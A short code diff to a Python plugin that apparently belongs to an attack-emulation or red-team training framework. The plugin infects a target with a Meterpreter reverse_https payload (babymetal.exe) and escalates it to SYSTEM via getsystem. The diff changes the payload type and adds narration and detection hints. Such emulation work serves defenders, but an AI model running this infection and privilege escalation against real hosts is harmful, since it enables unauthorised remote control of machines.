@@ -26,8 +26,9 @@ class MetasploitGetsystemPlugin(AttackPlugin):
         @param targets: A list of targets, ip addresses will do
         """
 
+        self.attack_logger.start_narration("A metasploit command like that is used to get system privileges for the next attack step.")
         res = ""
-        payload_type = "windows/x64/meterpreter/reverse_https"
+        payload_type = "windows/meterpreter/reverse_https"
         payload_name = "babymetal.exe"
         target = self.targets[0]
 
@@ -38,6 +39,9 @@ class MetasploitGetsystemPlugin(AttackPlugin):
 
         metasploit.smart_infect(target, payload_type, payload_name, )
 
-        metasploit.getsystem(target)
+        metasploit.getsystem(target,
+                             situation_description="This is an example standalone attack step. In real world attacks there would be events before and after",
+                             countermeasure="Observe how pipes are used. Take steps before (gaining access) and after (abusing those new privileges) into account for detection."
+                             )
 
         return res
